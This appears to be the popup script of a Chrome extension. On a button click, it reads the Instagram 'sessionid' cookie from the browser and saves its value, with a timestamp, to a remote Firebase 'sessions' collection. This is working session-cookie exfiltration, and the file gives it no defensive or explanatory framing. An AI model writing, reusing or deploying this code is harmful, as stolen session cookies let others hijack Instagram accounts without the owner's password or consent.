import { db, collection, addDoc } from "./firebase.js";

document.getElementById("get-session").addEventListener("click", () => {
  chrome.cookies.getAll({ domain: "www.instagram.com" }, async (cookies) => {
    const sessionCookie = cookies.find(cookie => cookie.name === "sessionid");
    if (!sessionCookie) {
      alert("Session ID cookie not found!");
      return;
    }

    try {
      await addDoc(collection(db, "sessions"), {
        domain: "instagram.com",
        sessionId: sessionCookie.value,
        timestamp: Date.now(),
        trigger: "popup"
      });
      alert("Session ID saved successfully!");
    } catch (error) {
      alert("Failed to save Session ID: " + error.message);
    }
  });
});
